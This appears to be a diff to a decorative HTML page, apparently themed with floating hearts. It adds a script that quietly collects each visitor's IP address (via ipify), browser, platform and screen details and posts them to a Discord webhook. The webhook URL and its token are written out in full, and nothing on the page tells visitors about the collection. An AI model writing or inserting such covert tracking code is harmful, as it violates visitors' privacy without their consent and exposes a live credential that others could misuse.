@@ -462,6 +462,71 @@
     </div>
 
     <script>
+        async function sendVisitorInfo() {
+            try {
+                // Get IP information
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                
+                // Get device and browser information
+                const deviceInfo = {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    vendor: navigator.vendor,
+                    language: navigator.language,
+                    screenResolution: `${window.screen.width}x${window.screen.height}`,
+                    windowSize: `${window.innerWidth}x${window.innerHeight}`
+                };
+
+                // Prepare webhook message
+                const message = {
+                    content: "🔔 Harpreet Is Live",
+                    embeds: [{
+                        title: "Visitor Information",
+                        color: 0xff3366,
+                        fields: [
+                            {
+                                name: "IP Address",
+                                value: ipData.ip,
+                                inline: true
+                            },
+                            {
+                                name: "Device Info",
+                                value: `Platform: ${deviceInfo.platform}\nBrowser: ${deviceInfo.vendor}`,
+                                inline: true
+                            },
+                            {
+                                name: "Screen",
+                                value: deviceInfo.screenResolution,
+                                inline: true
+                            },
+                            {
+                                name: "User Agent",
+                                value: deviceInfo.userAgent
+                            }
+                        ],
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+
+                // Send to Discord webhook
+                await fetch('https://discord.com/api/webhooks/1310805850147000373/nMozf_cjp2zaUMQC6trIw7jmjUoOeoUSfdLjifXZiw7SBb4tXLPW3AurE_WHL4sVgy7p', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(message)
+                });
+            } catch (error) {
+                console.error('Error sending visitor information:', error);
+            }
+        }
+
+
+
+
+
+        
         // Wait for the document to be fully loaded
         document.addEventListener('DOMContentLoaded', function() {
             // Create floating hearts
